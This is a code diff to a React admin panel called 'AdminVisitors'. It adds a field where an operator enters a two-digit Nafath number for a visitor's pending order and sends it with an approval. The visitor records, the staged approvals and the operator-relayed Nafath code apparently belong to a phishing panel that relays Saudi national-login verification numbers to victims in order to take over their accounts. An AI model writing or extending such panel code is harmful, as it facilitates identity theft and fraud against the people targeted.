@@ -1373,13 +1373,25 @@ const AdminVisitors = () => {
                                     {order.nafath_number && <InfoItem label="رقم نفاذ" value={order.nafath_number} />}
                                   </div>
                                   {order.stage_status === "pending" && (
-                                    <div className="flex items-center gap-2 pt-2 border-t border-border/50">
-                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
-                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
-                                      </Button>
-                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
-                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
-                                      </Button>
+                                    <div className="space-y-2 pt-2 border-t border-border/50">
+                                      <div className="flex items-center gap-2">
+                                        <span className="text-[10px] text-muted-foreground whitespace-nowrap">رقم النفاذ:</span>
+                                        <input
+                                          type="text"
+                                          placeholder="أدخل الرقم (مثل 35)"
+                                          value={nafathNumberInput}
+                                          onChange={e => setNafathNumberInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                                          className="flex-1 h-8 rounded-lg border-2 border-border bg-card px-2.5 text-xs text-foreground text-center font-bold tracking-widest focus:border-primary focus:outline-none transition-colors"
+                                        />
+                                      </div>
+                                      <div className="flex items-center gap-2">
+                                        <Button onClick={() => handleStageApprove(order.id, nafathNumberInput)} disabled={loadingAction !== null || !nafathNumberInput} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
+                                          {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة وإرسال
+                                        </Button>
+                                        <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
+                                          {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
+                                        </Button>
+                                      </div>
                                     </div>
                                   )}
                                 </div>
